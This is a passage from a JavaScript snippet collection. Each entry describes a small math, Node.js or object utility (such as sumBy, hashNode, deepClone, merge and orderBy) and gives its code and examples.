[...arr].reduce((acc, val) => acc + val, 0);\n\nExamples\nsum(1, 2, 3, 4); // 10\nsum(...[1, 2, 3, 4]); // 10\n\n\u2b06 Back to top\nsumBy\nReturns the sum of an array, after mapping each element to a value using the provided function.\nUse Array.prototype.map() to map each element to the value returned by fn, Array.prototype.reduce() to add each value to an accumulator, initialized with a value of 0.\nconst sumBy = (arr, fn) =>\n  arr.map(typeof fn === 'function' ? fn : val => val[fn]).reduce((acc, val) => acc + val, 0);\n\nExamples\nsumBy([{ n: 4 }, { n: 2 }, { n: 8 }, { n: 6 }], o => o.n); // 20\nsumBy([{ n: 4 }, { n: 2 }, { n: 8 }, { n: 6 }], 'n'); // 20\n\n\u2b06 Back to top\nsumPower\nReturns the sum of the powers of all the numbers from start to end (both inclusive).\nUse Array.prototype.fill() to create an array of all the numbers in the target range, Array.prototype.map() and the exponent operator (**) to raise them to power and Array.prototype.reduce() to add them together.\nOmit the second argument, power, to use a default power of 2.\nOmit the third argument, start, to use a default starting value of 1.\nconst sumPower = (end, power = 2, start = 1) =>\n  Array(end + 1 - start)\n    .fill(0)\n    .map((x, i) => (i + start) ** power)\n    .reduce((a, b) => a + b, 0);\n\nExamples\nsumPower(10); // 385\nsumPower(10, 3); // 3025\nsumPower(10, 3, 5); // 2925\n\n\u2b06 Back to top\ntoSafeInteger\nConverts a value to a safe integer.\nUse Math.max() and Math.min() to find the closest safe value.\nUse Math.round() to convert to an integer.\nconst toSafeInteger = num =>\n  Math.round(Math.max(Math.min(num, Number.MAX_SAFE_INTEGER), Number.MIN_SAFE_INTEGER));\n\nExamples\ntoSafeInteger('3.2'); // 3\ntoSafeInteger(Infinity); // 9007199254740991\n\n\u2b06 Back to top\nvectorDistance\nReturns the distance between two vectors.\nUse Array.prototype.reduce(), Math.pow() and Math.sqrt() to calculate the Euclidean distance between two vectors.\nconst vectorDistance = (...coords) => {\n  let pointLength = Math.trunc(coords.length / 2);\n  let sum = coords\n    .slice(0, pointLength)\n    .reduce((acc, val, i) => acc + Math.pow(val - coords[pointLength + i], 2), 0);\n  return Math.sqrt(sum);\n};\n\nExamples\nvectorDistance(10, 0, 5, 20, 0, 10); // 11.180339887498949\n\n\u2b06 Back to top\n\n\ud83d\udce6 Node\natob\nDecodes a string of data which has been encoded using base-64 encoding.\nCreate a Buffer for the given string with base-64 encoding and use Buffer.toString('binary') to return the decoded string.\nconst atob = str => Buffer.from(str, 'base64').toString('binary');\n\nExamples\natob('Zm9vYmFy'); // 'foobar'\n\n\u2b06 Back to top\nbtoa\nCreates a base-64 encoded ASCII string from a String object in which each character in the string is treated as a byte of binary data.\nCreate a Buffer for the given string with binary encoding and use Buffer.toString('base64') to return the encoded string.\nconst btoa = str => Buffer.from(str, 'binary').toString('base64');\n\nExamples\nbtoa('foobar'); // 'Zm9vYmFy'\n\n\u2b06 Back to top\ncolorize\nAdd special characters to text to print in color in the console (combined with console.log()).\nUse template literals and special characters to add the appropriate color code to the string output.\nFor background colors, add a special character that resets the background color at the end of the string.\nconst colorize = (...args) => ({\n  black: `\\x1b[30m${args.join(' ')}`,\n  red: `\\x1b[31m${args.join(' ')}`,\n  green: `\\x1b[32m${args.join(' ')}`,\n  yellow: `\\x1b[33m${args.join(' ')}`,\n  blue: `\\x1b[34m${args.join(' ')}`,\n  magenta: `\\x1b[35m${args.join(' ')}`,\n  cyan: `\\x1b[36m${args.join(' ')}`,\n  white: `\\x1b[37m${args.join(' ')}`,\n  bgBlack: `\\x1b[40m${args.join(' ')}\\x1b[0m`,\n  bgRed: `\\x1b[41m${args.join(' ')}\\x1b[0m`,\n  bgGreen: `\\x1b[42m${args.join(' ')}\\x1b[0m`,\n  bgYellow: `\\x1b[43m${args.join(' ')}\\x1b[0m`,\n  bgBlue: `\\x1b[44m${args.join(' ')}\\x1b[0m`,\n  bgMagenta: `\\x1b[45m${args.join(' ')}\\x1b[0m`,\n  bgCyan: `\\x1b[46m${args.join(' ')}\\x1b[0m`,\n  bgWhite: `\\x1b[47m${args.join(' ')}\\x1b[0m`\n});\n\nExamples\nconsole.log(colorize('foo').red); // 'foo' (red letters)\nconsole.log(colorize('foo', 'bar').bgBlue); // 'foo bar' (blue background)\nconsole.log(colorize(colorize('foo').yellow, colorize('foo').green).bgWhite); // 'foo bar' (first word in yellow letters, second word in green letters, white background for both)\n\n\u2b06 Back to top\ncreateDirIfNotExists\nCreates a directory, if it does not exist.\nUse fs.existsSync() to check if the directory exists, fs.mkdirSync() to create it.\nconst fs = require('fs');\nconst createDirIfNotExists = dir => (!fs.existsSync(dir) ? fs.mkdirSync(dir) : undefined);\n\nExamples\ncreateDirIfNotExists('test'); // creates the directory 'test', if it doesn't exist\n\n\u2b06 Back to top\nhasFlags\nCheck if the current process's arguments contain the specified flags.\nUse Array.prototype.every() and Array.prototype.includes() to check if process.argv contains all the specified flags.\nUse a regular expression to test if the specified flags are prefixed with - or -- and prefix them accordingly.\nconst hasFlags = (...flags) =>\n  flags.every(flag => process.argv.includes(/^-{1,2}/.test(flag) ? flag : '--' + flag));\n\nExamples\n// node myScript.js -s --test --cool=true\nhasFlags('-s'); // true\nhasFlags('--test', 'cool=true', '-s'); // true\nhasFlags('special'); // false\n\n\u2b06 Back to top\nhashNode\nCreates a hash for a value using the SHA-256 algorithm. Returns a promise.\nUse crypto API to create a hash for the given value, setTimeout to prevent blocking on a long operation, and a Promise to give it a familiar interface.\nconst crypto = require('crypto');\nconst hashNode = val =>\n  new Promise(resolve =>\n    setTimeout(\n      () =>\n        resolve(\n          crypto\n            .createHash('sha256')\n            .update(val)\n            .digest('hex')\n        ),\n      0\n    )\n  );\n\nExamples\nhashNode(JSON.stringify({ a: 'a', b: [1, 2, 3, 4], foo: { c: 'bar' } })).then(console.log); // '04aa106279f5977f59f9067fa9712afc4aedc6f5862a8defc34552d8c7206393'\n\n\u2b06 Back to top\nisDuplexStream\nChecks if the given argument is a duplex (readable and writable) stream.\nCheck if the value is different from null, use typeof to check if a value is of type object and the pipe property is of type function.\nAdditionally check if the typeof the _read, _write and _readableState, _writableState properties are function and object respectively.\nconst isDuplexStream = val =>\n  val !== null &&\n  typeof val === 'object' &&\n  typeof val.pipe === 'function' &&\n  typeof val._read === 'function' &&\n  typeof val._readableState === 'object' &&\n  typeof val._write === 'function' &&\n  typeof val._writableState === 'object';\n\nExamples\nconst Stream = require('stream');\nisDuplexStream(new Stream.Duplex()); // true\n\n\u2b06 Back to top\nisReadableStream\nChecks if the given argument is a readable stream.\nCheck if the value is different from null, use typeof to check if the value is of type object and the pipe property is of type function.\nAdditionally check if the typeof the _read and _readableState properties are function and object respectively.\nconst isReadableStream = val =>\n  val !== null &&\n  typeof val === 'object' &&\n  typeof val.pipe === 'function' &&\n  typeof val._read === 'function' &&\n  typeof val._readableState === 'object';\n\nExamples\nconst fs = require('fs');\nisReadableStream(fs.createReadStream('test.txt')); // true\n\n\u2b06 Back to top\nisStream\nChecks if the given argument is a stream.\nCheck if the value is different from null, use typeof to check if the value is of type object and the pipe property is of type function.\nconst isStream = val => val !== null && typeof val === 'object' && typeof val.pipe === 'function';\n\nExamples\nconst fs = require('fs');\nisStream(fs.createReadStream('test.txt')); // true\n\n\u2b06 Back to top\nisTravisCI\nChecks if the current environment is Travis CI.\nChecks if the current environment has the TRAVIS and CI environment variables (reference).\nconst isTravisCI = () => 'TRAVIS' in process.env && 'CI' in process.env;\n\nExamples\nisTravisCI(); // true (if code is running on Travis CI)\n\n\u2b06 Back to top\nisWritableStream\nChecks if the given argument is a writable stream.\nCheck if the value is different from null, use typeof to check if the value is of type object and the pipe property is of type function.\nAdditionally check if the typeof the _write and _writableState properties are function and object respectively.\nconst isWritableStream = val =>\n  val !== null &&\n  typeof val === 'object' &&\n  typeof val.pipe === 'function' &&\n  typeof val._write === 'function' &&\n  typeof val._writableState === 'object';\n\nExamples\nconst fs = require('fs');\nisWritableStream(fs.createWriteStream('test.txt')); // true\n\n\u2b06 Back to top\nJSONToFile\nWrites a JSON object to a file.\nUse fs.writeFile(), template literals and JSON.stringify() to write a json object to a .json file.\nconst fs = require('fs');\nconst JSONToFile = (obj, filename) =>\n  fs.writeFile(`${filename}.json`, JSON.stringify(obj, null, 2));\n\nExamples\nJSONToFile({ test: 'is passed' }, 'testJsonFile'); // writes the object to 'testJsonFile.json'\n\n\u2b06 Back to top\nreadFileLines\nReturns an array of lines from the specified file.\nUse readFileSync function in fs node package to create a Buffer from a file.\nconvert buffer to string using toString(encoding) function.\ncreating an array from contents of file by spliting file content line by line (each \\n).\nconst fs = require('fs');\nconst readFileLines = filename =>\n  fs\n    .readFileSync(filename)\n    .toString('UTF8')\n    .split('\\n');\n\nExamples\n/*\ncontents of test.txt :\n  line1\n  line2\n  line3\n  ___________________________\n*/\nlet arr = readFileLines('test.txt');\nconsole.log(arr); // ['line1', 'line2', 'line3']\n\n\u2b06 Back to top\nuntildify\nConverts a tilde path to an absolute path.\nUse String.prototype.replace() with a regular expression and OS.homedir() to replace the ~ in the start of the path with the home directory.\nconst untildify = str => str.replace(/^~($|\\/|\\\\)/, `${require('os').homedir()}$1`);\n\nExamples\nuntildify('~/node'); // '/Users/aUser/node'\n\n\u2b06 Back to top\nUUIDGeneratorNode\nGenerates a UUID in Node.JS.\nUse crypto API to generate a UUID, compliant with RFC4122 version 4.\nconst crypto = require('crypto');\nconst UUIDGeneratorNode = () =>\n  ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, c =>\n    (c ^ (crypto.randomBytes(1)[0] & (15 >> (c / 4)))).toString(16)\n  );\n\nExamples\nUUIDGeneratorNode(); // '79c7c136-60ee-40a2-beb2-856f1feabefc'\n\n\u2b06 Back to top\n\n\ud83d\uddc3\ufe0f Object\nbindAll\nBinds methods of an object to the object itself, overwriting the existing method.\nUse Array.prototype.forEach() to return a function that uses Function.prototype.apply() to apply the given context (obj) to fn for each function specified.\nconst bindAll = (obj, ...fns) =>\n  fns.forEach(\n    fn => (\n      (f = obj[fn]),\n      (obj[fn] = function() {\n        return f.apply(obj);\n      })\n    )\n  );\n\nExamples\nvar view = {\n  label: 'docs',\n  click: function() {\n    console.log('clicked ' + this.label);\n  }\n};\nbindAll(view, 'click');\njQuery(element).on('click', view.click); // Logs 'clicked docs' when clicked.\n\n\u2b06 Back to top\ndeepClone\nCreates a deep clone of an object.\nUse recursion.\nUse Object.assign() and an empty object ({}) to create a shallow clone of the original.\nUse Object.keys() and Array.prototype.forEach() to determine which key-value pairs need to be deep cloned.\nconst deepClone = obj => {\n  let clone = Object.assign({}, obj);\n  Object.keys(clone).forEach(\n    key => (clone[key] = typeof obj[key] === 'object' ? deepClone(obj[key]) : obj[key])\n  );\n  return Array.isArray(obj) && obj.length\n    ? (clone.length = obj.length) && Array.from(clone)\n    : Array.isArray(obj)\n      ? Array.from(obj)\n      : clone;\n};\n\nExamples\nconst a = { foo: 'bar', obj: { a: 1, b: 2 } };\nconst b = deepClone(a); // a !== b, a.obj !== b.obj\n\n\u2b06 Back to top\ndeepFreeze\nDeep freezes an object.\nCalls Object.freeze(obj) recursively on all unfrozen properties of passed object that are instanceof object.\nconst deepFreeze = obj =>\n  Object.keys(obj).forEach(\n    prop =>\n      !(obj[prop] instanceof Object) || Object.isFrozen(obj[prop]) ? null : deepFreeze(obj[prop])\n  ) || Object.freeze(obj);\n\nExamples\n'use strict';\n\nconst o = deepFreeze([1, [2, 3]]);\n\no[0] = 3; // not allowed\no[1][0] = 4; // not allowed as well\n\n\u2b06 Back to top\ndeepMapKeys \nDeep maps an object keys.\nCreates an object with the same values as the provided object and keys generated by running the provided function for each key.\nUse Object.keys(obj) to iterate over the object's keys.\nUse Array.prototype.reduce() to create a new object with the same values and mapped keys using fn.\nconst deepMapKeys = (obj, f) =>\n  Array.isArray(obj)\n    ? obj.map(val => deepMapKeys(val, f))\n    : typeof obj === 'object'\n      ? Object.keys(obj).reduce((acc, current) => {\n        const val = obj[current];\n        acc[f(current)] =\n            val !== null && typeof val === 'object' ? deepMapKeys(val, f) : (acc[f(current)] = val);\n        return acc;\n      }, {})\n      : obj;\n\nExamples\nconst obj = {\n  foo: '1',\n  nested: {\n    child: {\n      withArray: [\n        {\n          grandChild: ['hello']\n        }\n      ]\n    }\n  }\n};\nconst upperKeysObj = deepMapKeys(obj, key => key.toUpperCase());\n/*\n{\n  \"FOO\":\"1\",\n  \"NESTED\":{\n    \"CHILD\":{\n      \"WITHARRAY\":[\n        {\n          \"GRANDCHILD\":[ 'hello' ]\n        }\n      ]\n    }\n  }\n}\n*/\n\n\u2b06 Back to top\ndefaults\nAssigns default values for all properties in an object that are undefined.\nUse Object.assign() to create a new empty object and copy the original one to maintain key order, use Array.prototype.reverse() and the spread operator ... to combine the default values from left to right, finally use obj again to overwrite properties that originally had a value.\nconst defaults = (obj, ...defs) => Object.assign({}, obj, ...defs.reverse(), obj);\n\nExamples\ndefaults({ a: 1 }, { b: 2 }, { b: 6 }, { a: 3 }); // { a: 1, b: 2 }\n\n\u2b06 Back to top\ndig\nReturns the target value in a nested JSON object, based on the given key.\nUse the in operator to check if target exists in obj.\nIf found, return the value of obj[target], otherwise use Object.values(obj) and Array.prototype.reduce() to recursively call dig on each nested object until the first matching key/value pair is found.\nconst dig = (obj, target) =>\n  target in obj\n    ? obj[target]\n    : Object.values(obj).reduce((acc, val) => {\n      if (acc !== undefined) return acc;\n      if (typeof val === 'object') return dig(val, target);\n    }, undefined);\n\nExamples\nconst data = {\n  level1: {\n    level2: {\n      level3: 'some data'\n    }\n  }\n};\ndig(data, 'level3'); // 'some data'\ndig(data, 'level4'); // undefined\n\n\u2b06 Back to top\nequals \nPerforms a deep comparison between two values to determine if they are equivalent.\nCheck if the two values are identical, if they are both Date objects with the same time, using Date.getTime() or if they are both non-object values with an equivalent value (strict comparison).\nCheck if only one value is null or undefined or if their prototypes differ.\nIf none of the above conditions are met, use Object.keys() to check if both values have the same number of keys, then use Array.prototype.every() to check if every key in the first value exists in the second one and if they are equivalent by calling this method recursively.\nconst equals = (a, b) => {\n  if (a === b) return true;\n  if (a instanceof Date && b instanceof Date) return a.getTime() === b.getTime();\n  if (!a || !b || (typeof a !== 'object' && typeof b !== 'object')) return a === b;\n  if (a === null || a === undefined || b === null || b === undefined) return false;\n  if (a.prototype !== b.prototype) return false;\n  let keys = Object.keys(a);\n  if (keys.length !== Object.keys(b).length) return false;\n  return keys.every(k => equals(a[k], b[k]));\n};\n\nExamples\nequals({ a: [2, { e: 3 }], b: [4], c: 'foo' }, { a: [2, { e: 3 }], b: [4], c: 'foo' }); // true\n\n\u2b06 Back to top\nfindKey\nReturns the first key that satisfies the provided testing function. Otherwise undefined is returned.\nUse Object.keys(obj) to get all the properties of the object, Array.prototype.find() to test the provided function for each key-value pair. The callback receives three arguments - the value, the key and the object.\nconst findKey = (obj, fn) => Object.keys(obj).find(key => fn(obj[key], key, obj));\n\nExamples\nfindKey(\n  {\n    barney: { age: 36, active: true },\n    fred: { age: 40, active: false },\n    pebbles: { age: 1, active: true }\n  },\n  o => o['active']\n); // 'barney'\n\n\u2b06 Back to top\nfindLastKey\nReturns the last key that satisfies the provided testing function.\nOtherwise undefined is returned.\nUse Object.keys(obj) to get all the properties of the object, Array.prototype.reverse() to reverse their order and Array.prototype.find() to test the provided function for each key-value pair.\nThe callback receives three arguments - the value, the key and the object.\nconst findLastKey = (obj, fn) =>\n  Object.keys(obj)\n    .reverse()\n    .find(key => fn(obj[key], key, obj));\n\nExamples\nfindLastKey(\n  {\n    barney: { age: 36, active: true },\n    fred: { age: 40, active: false },\n    pebbles: { age: 1, active: true }\n  },\n  o => o['active']\n); // 'pebbles'\n\n\u2b06 Back to top\nflattenObject\nFlatten an object with the paths for keys.\nUse recursion.\nUse Object.keys(obj) combined with Array.prototype.reduce() to convert every leaf node to a flattened path node.\nIf the value of a key is an object, the function calls itself with the appropriate prefix to create the path using Object.assign().\nOtherwise, it adds the appropriate prefixed key-value pair to the accumulator object.\nYou should always omit the second argument, prefix, unless you want every key to have a prefix.\nconst flattenObject = (obj, prefix = '') =>\n  Object.keys(obj).reduce((acc, k) => {\n    const pre = prefix.length ? prefix + '.' : '';\n    if (typeof obj[k] === 'object') Object.assign(acc, flattenObject(obj[k], pre + k));\n    else acc[pre + k] = obj[k];\n    return acc;\n  }, {});\n\nExamples\nflattenObject({ a: { b: { c: 1 } }, d: 1 }); // { 'a.b.c': 1, d: 1 }\n\n\u2b06 Back to top\nforOwn\nIterates over all own properties of an object, running a callback for each one.\nUse Object.keys(obj) to get all the properties of the object, Array.prototype.forEach() to run the provided function for each key-value pair. The callback receives three arguments - the value, the key and the object.\nconst forOwn = (obj, fn) => Object.keys(obj).forEach(key => fn(obj[key], key, obj));\n\nExamples\nforOwn({ foo: 'bar', a: 1 }, v => console.log(v)); // 'bar', 1\n\n\u2b06 Back to top\nforOwnRight\nIterates over all own properties of an object in reverse, running a callback for each one.\nUse Object.keys(obj) to get all the properties of the object, Array.prototype.reverse() to reverse their order and Array.prototype.forEach() to run the provided function for each key-value pair. The callback receives three arguments - the value, the key and the object.\nconst forOwnRight = (obj, fn) =>\n  Object.keys(obj)\n    .reverse()\n    .forEach(key => fn(obj[key], key, obj));\n\nExamples\nforOwnRight({ foo: 'bar', a: 1 }, v => console.log(v)); // 1, 'bar'\n\n\u2b06 Back to top\nfunctions\nReturns an array of function property names from own (and optionally inherited) enumerable properties of an object.\nUse Object.keys(obj) to iterate over the object's own properties.\nIf inherited is true, use Object.get.PrototypeOf(obj) to also get the object's inherited properties.\nUse Array.prototype.filter() to keep only those properties that are functions.\nOmit the second argument, inherited, to not include inherited properties by default.\nconst functions = (obj, inherited = false) =>\n  (inherited\n    ? [...Object.keys(obj), ...Object.keys(Object.getPrototypeOf(obj))]\n    : Object.keys(obj)\n  ).filter(key => typeof obj[key] === 'function');\n\nExamples\nfunction Foo() {\n  this.a = () => 1;\n  this.b = () => 2;\n}\nFoo.prototype.c = () => 3;\nfunctions(new Foo()); // ['a', 'b']\nfunctions(new Foo(), true); // ['a', 'b', 'c']\n\n\u2b06 Back to top\nget\nRetrieve a set of properties indicated by the given selectors from an object.\nUse Array.prototype.map() for each selector, String.prototype.replace() to replace square brackets with dots, String.prototype.split('.') to split each selector, Array.prototype.filter() to remove empty values and Array.prototype.reduce() to get the value indicated by it.\nconst get = (from, ...selectors) =>\n  [...selectors].map(s =>\n    s\n      .replace(/\\[([^\\[\\]]*)\\]/g, '.$1.')\n      .split('.')\n      .filter(t => t !== '')\n      .reduce((prev, cur) => prev && prev[cur], from)\n  );\n\nExamples\nconst obj = { selector: { to: { val: 'val to select' } }, target: [1, 2, { a: 'test' }] };\nget(obj, 'selector.to.val', 'target[0]', 'target[2].a'); // ['val to select', 1, 'test']\n\n\u2b06 Back to top\ninvertKeyValues\nInverts the key-value pairs of an object, without mutating it. The corresponding inverted value of each inverted key is an array of keys responsible for generating the inverted value. If a function is supplied, it is applied to each inverted key.\nUse Object.keys() and Array.prototype.reduce() to invert the key-value pairs of an object and apply the function provided (if any).\nOmit the second argument, fn, to get the inverted keys without applying a function to them.\nconst invertKeyValues = (obj, fn) =>\n  Object.keys(obj).reduce((acc, key) => {\n    const val = fn ? fn(obj[key]) : obj[key];\n    acc[val] = acc[val] || [];\n    acc[val].push(key);\n    return acc;\n  }, {});\n\nExamples\ninvertKeyValues({ a: 1, b: 2, c: 1 }); // { 1: [ 'a', 'c' ], 2: [ 'b' ] }\ninvertKeyValues({ a: 1, b: 2, c: 1 }, value => 'group' + value); // { group1: [ 'a', 'c' ], group2: [ 'b' ] }\n\n\u2b06 Back to top\nlowercaseKeys\nCreates a new object from the specified object, where all the keys are in lowercase.\nUse Object.keys() and Array.prototype.reduce() to create a new object from the specified object.\nConvert each key in the original object to lowercase, using String.toLowerCase().\nconst lowercaseKeys = obj =>\n  Object.keys(obj).reduce((acc, key) => {\n    acc[key.toLowerCase()] = obj[key];\n    return acc;\n  }, {});\n\nExamples\nconst myObj = { Name: 'Adam', sUrnAME: 'Smith' };\nconst myObjLower = lowercaseKeys(myObj); // {name: 'Adam', surname: 'Smith'};\n\n\u2b06 Back to top\nmapKeys\nCreates an object with keys generated by running the provided function for each key and the same values as the provided object.\nUse Object.keys(obj) to iterate over the object's keys.\nUse Array.prototype.reduce() to create a new object with the same values and mapped keys using fn.\nconst mapKeys = (obj, fn) =>\n  Object.keys(obj).reduce((acc, k) => {\n    acc[fn(obj[k], k, obj)] = obj[k];\n    return acc;\n  }, {});\n\nExamples\nmapKeys({ a: 1, b: 2 }, (val, key) => key + val); // { a1: 1, b2: 2 }\n\n\u2b06 Back to top\nmapValues\nCreates an object with the same keys as the provided object and values generated by running the provided function for each value.\nUse Object.keys(obj) to iterate over the object's keys.\nUse Array.prototype.reduce() to create a new object with the same keys and mapped values using fn.\nconst mapValues = (obj, fn) =>\n  Object.keys(obj).reduce((acc, k) => {\n    acc[k] = fn(obj[k], k, obj);\n    return acc;\n  }, {});\n\nExamples\nconst users = {\n  fred: { user: 'fred', age: 40 },\n  pebbles: { user: 'pebbles', age: 1 }\n};\nmapValues(users, u => u.age); // { fred: 40, pebbles: 1 }\n\n\u2b06 Back to top\nmatches\nCompares two objects to determine if the first one contains equivalent property values to the second one.\nUse Object.keys(source) to get all the keys of the second object, then Array.prototype.every(), Object.hasOwnProperty() and strict comparison to determine if all keys exist in the first object and have the same values.\nconst matches = (obj, source) =>\n  Object.keys(source).every(key => obj.hasOwnProperty(key) && obj[key] === source[key]);\n\nExamples\nmatches({ age: 25, hair: 'long', beard: true }, { hair: 'long', beard: true }); // true\nmatches({ hair: 'long', beard: true }, { age: 25, hair: 'long', beard: true }); // false\n\n\u2b06 Back to top\nmatchesWith\nCompares two objects to determine if the first one contains equivalent property values to the second one, based on a provided function.\nUse Object.keys(source) to get all the keys of the second object, then Array.prototype.every(), Object.hasOwnProperty() and the provided function to determine if all keys exist in the first object and have equivalent values.\nIf no function is provided, the values will be compared using the equality operator.\nconst matchesWith = (obj, source, fn) =>\n  Object.keys(source).every(\n    key =>\n      obj.hasOwnProperty(key) && fn\n        ? fn(obj[key], source[key], key, obj, source)\n        : obj[key] == source[key]\n  );\n\nExamples\nconst isGreeting = val => /^h(?:i|ello)$/.test(val);\nmatchesWith(\n  { greeting: 'hello' },\n  { greeting: 'hi' },\n  (oV, sV) => isGreeting(oV) && isGreeting(sV)\n); // true\n\n\u2b06 Back to top\nmerge\nCreates a new object from the combination of two or more objects.\nUse Array.prototype.reduce() combined with Object.keys(obj) to iterate over all objects and keys.\nUse hasOwnProperty() and Array.prototype.concat() to append values for keys existing in multiple objects.\nconst merge = (...objs) =>\n  [...objs].reduce(\n    (acc, obj) =>\n      Object.keys(obj).reduce((a, k) => {\n        acc[k] = acc.hasOwnProperty(k) ? [].concat(acc[k]).concat(obj[k]) : obj[k];\n        return acc;\n      }, {}),\n    {}\n  );\n\nExamples\nconst object = {\n  a: [{ x: 2 }, { y: 4 }],\n  b: 1\n};\nconst other = {\n  a: { z: 3 },\n  b: [2, 3],\n  c: 'foo'\n};\nmerge(object, other); // { a: [ { x: 2 }, { y: 4 }, { z: 3 } ], b: [ 1, 2, 3 ], c: 'foo' }\n\n\u2b06 Back to top\nnest\nGiven a flat array of objects linked to one another, it will nest them recursively.\nUseful for nesting comments, such as the ones on reddit.com.\nUse recursion.\nUse Array.prototype.filter() to filter the items where the id matches the link, then Array.prototype.map() to map each one to a new object that has a children property which recursively nests the items based on which ones are children of the current item.\nOmit the second argument, id, to default to null which indicates the object is not linked to another one (i.e. it is a top level object).\nOmit the third argument, link, to use 'parent_id' as the default property which links the object to another one by its id.\nconst nest = (items, id = null, link = 'parent_id') =>\n  items\n    .filter(item => item[link] === id)\n    .map(item => ({ ...item, children: nest(items, item.id) }));\n\nExamples\n// One top level comment\nconst comments = [\n  { id: 1, parent_id: null },\n  { id: 2, parent_id: 1 },\n  { id: 3, parent_id: 1 },\n  { id: 4, parent_id: 2 },\n  { id: 5, parent_id: 4 }\n];\nconst nestedComments = nest(comments); // [{ id: 1, parent_id: null, children: [...] }]\n\n\u2b06 Back to top\nobjectFromPairs\nCreates an object from the given key-value pairs.\nUse Array.prototype.reduce() to create and combine key-value pairs.\nconst objectFromPairs = arr => arr.reduce((a, [key, val]) => ((a[key] = val), a), {});\n\nExamples\nobjectFromPairs([['a', 1], ['b', 2]]); // {a: 1, b: 2}\n\n\u2b06 Back to top\nobjectToPairs\nCreates an array of key-value pair arrays from an object.\nUse Object.keys() and Array.prototype.map() to iterate over the object's keys and produce an array with key-value pairs.\nconst objectToPairs = obj => Object.keys(obj).map(k => [k, obj[k]]);\n\nExamples\nobjectToPairs({ a: 1, b: 2 }); // [ ['a', 1], ['b', 2] ]\n\n\u2b06 Back to top\nomit\nOmits the key-value pairs corresponding to the given keys from an object.\nUse Object.keys(obj), Array.prototype.filter() and Array.prototype.includes() to remove the provided keys.\nUse Array.prototype.reduce() to convert the filtered keys back to an object with the corresponding key-value pairs.\nconst omit = (obj, arr) =>\n  Object.keys(obj)\n    .filter(k => !arr.includes(k))\n    .reduce((acc, key) => ((acc[key] = obj[key]), acc), {});\n\nExamples\nomit({ a: 1, b: '2', c: 3 }, ['b']); // { 'a': 1, 'c': 3 }\n\n\u2b06 Back to top\nomitBy\nCreates an object composed of the properties the given function returns falsey for. The function is invoked with two arguments: (value, key).\nUse Object.keys(obj) and Array.prototype.filter()to remove the keys for which fn returns a truthy value.\nUse Array.prototype.reduce() to convert the filtered keys back to an object with the corresponding key-value pairs.\nconst omitBy = (obj, fn) =>\n  Object.keys(obj)\n    .filter(k => !fn(obj[k], k))\n    .reduce((acc, key) => ((acc[key] = obj[key]), acc), {});\n\nExamples\nomitBy({ a: 1, b: '2', c: 3 }, x => typeof x === 'number'); // { b: '2' }\n\n\u2b06 Back to top\norderBy\nReturns a sorted array of objects ordered by properties and orders.\nUses Array.prototype.sort(), Array.prototype.reduce() on the props array with a default value of 0, use array destructuring to swap the properties position depending on the order passed.\nIf no orders array is passed it sort by 'asc' by default.\nconst orderBy = (arr, props, orders) =>\n  [...arr].sort((a, b) =>\n    props.reduce((acc, prop, i) => {\n      if (acc === 0) {\n        const [p1, p2] = orders && orders[i] === 'desc' ? [b[prop], a[prop]] : [a[prop], b[prop]];\n        acc = p1 > p2 ? 1 : p1 < p2 ? -1 : 0;\n      }\n      return acc;\n    }, 0)\n  );\n\nExamples\nconst users = [{ name: 'fred', age: 48 }, { name: 'barney', age: 36 }, { name: 'fred', age: 40 }];\norderBy(users, ['name', 'age'], ['asc', 'desc']); // [{name: 'barney', age: 36}, {name: 'fred', age: 48}, {name: 'fred', age: 40}]\norderBy(users, ['name', 'age']); // [{name: 'barney', age: 36}, {name: 'fred', age: 40}, {name: 'fred', age: 48}]\n\n\u2b06 Back to top\npick\nPicks the key-value pairs corresponding to the given keys from an object.\nUse Array.prototype.reduce() to convert the filtered/picked keys back to an object with the corresponding key-value pairs if the key exists in the object.\nconst pick = (obj, arr) =>\n  arr.reduce((acc, curr) => (curr in obj && (acc[curr] = obj[curr]), acc), {});\n\nExamples\npick({ a: 1, b: '2', c: 3 }, ['a', 'c']); // { 'a': 1, 'c': 3 }\n\n\u2b06 Back to top\npickBy\nCreates an object composed of the properties the given function returns truthy for. The function is invoked with two arguments: (value, key).\nUse Object.keys(obj) and Array.prototype.filter()to remove the keys for which fn returns a falsey value.\nUse Array.prototype.reduce() to convert the filtered keys back to an object with the corresponding key-value pairs.\nconst pickBy = (obj, fn) =>\n  Object.keys(obj)\n    .filter(k => fn(obj[k], k))\n    .reduce((acc, key) => ((acc[key] = obj[key]), acc), {});\n\nExamples\npickBy({ a: 1, b: '2', c: 3 }, x => typeof x === 'number'); // { 'a': 1, 'c': 3 }\n\n\u2b06 Back to top\nrenameKeys\nReplaces the names of multiple object keys with the values provided.\nUse Object.keys() in combination with Array.prototype.reduce() and the spread operator (...) to get the object's keys and rename them according to keysMap.\nconst renameKeys = (keysMap, obj) =>\n  Object.keys(obj).reduce(\n    (acc, key) => ({\n      ...acc,\n      ...{ [keysMap[key] || key]: obj[key] }\n    }),\n    {}\n  );\n\nExamples\nconst obj = { name: 'Bobo', job: 'Front-End Master', shoeSize: 100 };\nrenameKeys({ name: 'firstName', job: 'passion' }, obj); // { firstName: 'Bobo', passion: 'Front-End Master', shoeSize: 100 }\n\n\u2b06 Back to top\nshallowClone\nCreates a shallow clone of an object.\nUse Object.assign() and an empty object ({}) to create a shallow clone of the original.\nconst shallowClone = obj => Object.assign({}, obj);\n\nExamples\nconst a = { x: true, y: 1 };\nconst b = shallowClone(a); // a !== b\n\n\u2b06 Back to top\nsize\nGet size of arrays, objects or strings.\nGet type of val (array, object or string).\nUse length property for arrays.\nUse length or size value if available or number of keys for objects.\nUse size of a Blob object created from val for strings.\nSplit strings into array of characters with split('') and return its length.\nconst size = val =>\n  Array.isArray(val)\n    ? val.length\n    : val && typeof val === 'object'\n      ? val.size || val.length || Object.keys(val).length\n      : typeof val === 'string'\n        ? new Blob([val]).size\n        : 0;\n\nExamples\nsize([1, 2, 3, 4, 5]); // 5\nsize('size'); // 4\nsize({ one: 1, two: 2, three: 3 }); // 3\n\n\u2b06 Back to top\ntransform\nApplies a function against an accumulator and each key in the object (from left to right).\nUse Object.keys(obj) to iterate over each key in the object, Array.prototype.reduce() to call the apply the specified function against the given accumulator.\nconst transform = (obj, fn, acc) => Object.keys(obj).reduce((a, k) => fn(a, obj[k], k, obj), acc);\n\nExamples\ntransform(\n  { a: 1, b: 2, c: 1 },\n  (r, v, k) => {\n    (r[v] || (r[v] = [])).push(k);\n    return r;\n  },\n  {}\n); // { '1': ['a', 'c'], '2': ['b'] 